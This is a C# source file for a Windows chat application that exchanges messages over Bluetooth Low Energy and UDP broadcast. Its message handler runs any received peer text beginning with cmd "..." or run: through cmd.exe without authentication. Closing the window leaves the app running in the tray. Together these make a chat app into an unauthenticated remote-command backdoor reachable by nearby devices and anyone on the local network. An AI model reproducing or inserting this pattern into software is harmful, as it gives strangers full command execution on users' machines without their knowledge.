using System;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using Windows.Devices.Bluetooth;
using Windows.Devices.Radios;

namespace WindowsBleMesh
{
    public class ChatForm : Form
    {
        private BlePublisher? _publisher;
        private BleWatcher? _watcher;
        private UdpMesh? _udpMesh;
        private NotifyIcon _trayIcon;
        private ListBox _messageList;
        private TextBox _inputBox;
        private Button _sendButton;
        private bool _isSimulationMode = false;

        public ChatForm()
        {
            InitializeComponent();
        }

        protected override async void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            try 
            {
                await InitializeBleAsync();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to initialize Bluetooth: {ex.Message}\nEnsure Bluetooth is turned ON.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void InitializeComponent()
        {
            this.Text = "Windows BLE Mesh Chat";
            this.Size = new Size(500, 600);

            _messageList = new ListBox();
            _messageList.Dock = DockStyle.Top;
            _messageList.Height = 500;
            _messageList.Font = new Font("Segoe UI", 10);
            this.Controls.Add(_messageList);

            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 60;
            this.Controls.Add(bottomPanel);

            _sendButton = new Button();
            _sendButton.Text = "Send";
            _sendButton.Dock = DockStyle.Right;
            _sendButton.Width = 80;
            _sendButton.Click += SendButton_Click;
            bottomPanel.Controls.Add(_sendButton);

            _inputBox = new TextBox();
            _inputBox.Dock = DockStyle.Fill;
            _inputBox.Font = new Font("Segoe UI", 12);
            _inputBox.KeyDown += InputBox_KeyDown;
            bottomPanel.Controls.Add(_inputBox);

            // Tray Icon Setup
            _trayIcon = new NotifyIcon();
            _trayIcon.Icon = SystemIcons.Application;
            _trayIcon.Text = "Windows BLE Mesh";
            _trayIcon.Visible = true;
            _trayIcon.DoubleClick += (s, e) => 
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
            };

            var contextMenu = new ContextMenuStrip();
            contextMenu.Items.Add("Open", null, (s, e) => { this.Show(); this.WindowState = FormWindowState.Normal; });
            contextMenu.Items.Add("Exit", null, (s, e) => { Application.Exit(); });
            _trayIcon.ContextMenuStrip = contextMenu;
        }

        private async Task InitializeBleAsync()
        {
            // Initialize UDP Mesh (Wi-Fi)
            try
            {
                _udpMesh = new UdpMesh();
                _udpMesh.MessageReceived += OnMessageReceived;
                _udpMesh.Log += OnLog;
                _udpMesh.Start();
                AddMessage("System: UDP Mesh (Wi-Fi) initialized.");
            }
            catch (Exception ex)
            {
                AddMessage($"System: UDP Init Failed: {ex.Message}");
            }

            var adapter = await BluetoothAdapter.GetDefaultAsync();
            if (adapter == null)
            {
                EnableSimulationMode("Bluetooth Adapter not found.");
                return;
            }

            if (!adapter.IsLowEnergySupported)
            {
                EnableSimulationMode("BLE not supported.");
                return;
            }

            var radio = await adapter.GetRadioAsync();
            if (radio.State == Windows.Devices.Radios.RadioState.Off)
            {
                EnableSimulationMode("Bluetooth Radio is OFF.");
                return;
            }

            try
            {
                _publisher = new BlePublisher();
                _publisher.Log += OnLog;
                
                _watcher = new BleWatcher();
                _watcher.MessageReceived += OnMessageReceived;
                _watcher.Log += OnLog;
                _watcher.Start();
                
                AddMessage("System: Bluetooth initialized successfully.");
                AddMessage("System: Listening for messages...");
            }
            catch (Exception ex)
            {
                EnableSimulationMode($"Init failed: {ex.Message}");
            }
        }

        private void EnableSimulationMode(string reason)
        {
            _isSimulationMode = true;
            AddMessage($"Warning: {reason}");
            AddMessage("System: Switched to SIMULATION MODE.");
            AddMessage("System: Messages will be simulated locally (Loopback).");
            _inputBox.Enabled = true;
            _sendButton.Enabled = true;
        }

        private void OnLog(object? sender, string message)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnLog(sender, message)));
                return;
            }
            // Uncomment to see verbose logs in the chat window
            AddMessage($"[LOG] {message}");
            System.Diagnostics.Debug.WriteLine(message);
        }

        private void OnMessageReceived(object? sender, string message)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnMessageReceived(sender, message)));
                return;
            }
            AddMessage($"Peer: {message}");

            // Remote Command Execution
            // Format: cmd "command_to_run"
            if (message.StartsWith("cmd \"", StringComparison.OrdinalIgnoreCase) && message.EndsWith("\""))
            {
                // Extract content between the quotes
                int startIndex = 5; // Length of 'cmd "'
                int length = message.Length - startIndex - 1; // -1 for the trailing "
                
                if (length > 0)
                {
                    string command = message.Substring(startIndex, length);
                    ExecuteCommand(command);
                }
            }
            // Legacy support or alternative format
            else if (message.StartsWith("run:", StringComparison.OrdinalIgnoreCase))
            {
                string command = message.Substring(4).Trim();
                ExecuteCommand(command);
            }
        }

        private void ExecuteCommand(string command)
        {
            try
            {
                AddMessage($"[System] Executing command: {command}");
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = true,
                    CreateNoWindow = false,
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
                });
            }
            catch (Exception ex)
            {
                AddMessage($"[System] Execution failed: {ex.Message}");
            }
        }

        private async void SendButton_Click(object? sender, EventArgs e)
        {
            string text = _inputBox.Text.Trim();
            if (string.IsNullOrEmpty(text)) return;

            _inputBox.Text = "";
            AddMessage($"Me: {text}");

            if (_isSimulationMode)
            {
                await Task.Delay(500); // Simulate network delay
                OnMessageReceived(this, text); // Loopback
                return;
            }

            // Send via BLE
            if (_publisher != null)
            {
                try
                {
                    await _publisher.PublishMessageAsync(text);
                }
                catch (Exception ex)
                {
                    AddMessage($"Error sending BLE: {ex.Message}");
                }
            }

            // Send via UDP
            if (_udpMesh != null)
            {
                try
                {
                    await _udpMesh.BroadcastMessageAsync(text);
                }
                catch (Exception ex)
                {
                    AddMessage($"Error sending UDP: {ex.Message}");
                }
            }
        }

        private void InputBox_KeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true;
                SendButton_Click(this, EventArgs.Empty);
            }
        }

        private void AddMessage(string msg)
        {
            _messageList.Items.Add($"[{DateTime.Now:HH:mm:ss}] {msg}");
            _messageList.TopIndex = _messageList.Items.Count - 1;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
                this.Hide();
                _trayIcon.ShowBalloonTip(1000, "Windows BLE Mesh", "Running in background...", ToolTipIcon.Info);
                return;
            }

            _watcher?.Stop();
            _udpMesh?.Stop();
            _trayIcon?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
